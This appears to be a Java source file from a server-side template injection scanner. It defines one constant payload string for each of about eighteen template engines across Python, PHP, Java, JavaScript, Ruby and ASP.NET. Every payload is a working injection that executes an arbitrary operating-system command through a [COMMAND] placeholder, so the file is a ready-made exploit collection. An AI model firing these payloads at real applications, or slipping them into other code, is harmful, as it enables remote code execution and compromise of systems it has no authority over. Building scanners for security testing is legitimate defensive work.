package sstiscanner.engines;

public class Payloads {
    // Python
    static final String JINJA2_PAYLOAD = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"[COMMAND]\").read().zfill(417)}}{%endif%}{% endfor %}";
    static final String MAKO_PAYLOAD = "${self.module.cache.util.os.system(\"[COMMAND]\")}";
    static final String TORNADO_PAYLOAD = "{% import os %}{{ os.popen(\"[COMMAND]\").read() }}";

    // PHP
    static final String SMARTY_PAYLOAD = "{system('[COMMAND]')}";
    static final String TWIG_PAYLOAD = "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"[COMMAND]\")}}";

    // Java
    static final String FREEMARKER_PAYLOAD = "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"[COMMAND]\")}";
    static final String VELOCITY_PAYLOAD = "#set($engine=\"\")\n" +
            "#set($run=$engine.getClass().forName(\"java.lang.Runtime\"))\n" +
            "#set($runtime=$run.getRuntime())\n" +
            "#set($proc=$runtime.exec(\"[COMMAND]\"))\n" +
            "#set($null=$proc.waitFor())\n" +
            "#set($istr=$proc.getInputStream())\n" +
            "#set($chr=$engine.getClass().forName(\"java.lang.Character\"))\n" +
            "#set($output=\"\")\n" +
            "#set($string=$engine.getClass().forName(\"java.lang.String\"))\n" +
            "#foreach($i in [1..$istr.available()])\n" +
            "#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\n" +
            "#end\n";
    static final String THYMELEAF_PAYLOAD = "[[${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(\"[COMMAND]\").waitFor()}]]";
    static final String PEBBLE_PAYLOAD = "{% set cmd = '[COMMAND]' %}\n" +
            "{% set bytes = (1).TYPE\n" +
            "     .forName('java.lang.Runtime')\n" +
            "     .methods[6]\n" +
            "     .invoke(null,null)\n" +
            "     .exec(cmd)\n" +
            "     .inputStream\n" +
            "     .readAllBytes() %}\n" +
            "{{ (1).TYPE\n" +
            "     .forName('java.lang.String')\n" +
            "     .constructors[0]\n" +
            "     .newInstance(([bytes]).toArray()) }}";

    // JavaScript
    static final String NUNJUCKS_PAYLOAD = "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('[COMMAND]')\")()}}";
    static final String DOT_PAYLOAD = "{{= global.process.mainModule.require('child_process').execSync('[COMMAND]').toString() }}";
    static final String EJS_PAYLOAD = "<%=global.process.mainModule.require('child_process').execSync('[COMMAND]').toString()%>";
    static final String MARKO_PAYLOAD = "${{require('child_process').execSync('[COMMAND]').toString()}}";
    static final String PUG_PAYLOAD = "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('[COMMAND]')}()}";
    static final String HANDLEBARS_PAYLOAD = "{{#with \"s\" as |string|}}\n" +
            "  {{#with \"e\"}}\n" +
            "    {{#with split as |conslist|}}\n" +
            "      {{this.pop}}\n" +
            "      {{this.push (lookup string.sub \"constructor\")}}\n" +
            "      {{this.pop}}\n" +
            "      {{#with string.split as |codelist|}}\n" +
            "        {{this.pop}}\n" +
            "        {{this.push \"return require('child_process').execSync('[COMMAND]');\"}}\n" +
            "        {{this.pop}}\n" +
            "        {{#each conslist}}\n" +
            "          {{#with (string.sub.apply 0 codelist)}}\n" +
            "            {{this}}\n" +
            "          {{/with}}\n" +
            "        {{/each}}\n" +
            "      {{/with}}\n" +
            "    {{/with}}\n" +
            "  {{/with}}\n" +
            "{{/with}}";

    // Ruby
    static final String SLIM_PAYLOAD = "#{%x( [COMMAND] )}";
    static final String ERB_PAYLOAD = "<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('[COMMAND]') %><%= @b.readline()%>";

    // ASP.NET
    static final String RAZOR_PAYLOAD = "@{ System.Diagnostics.Process.Start(\"[COMMAND]\"); }";
}
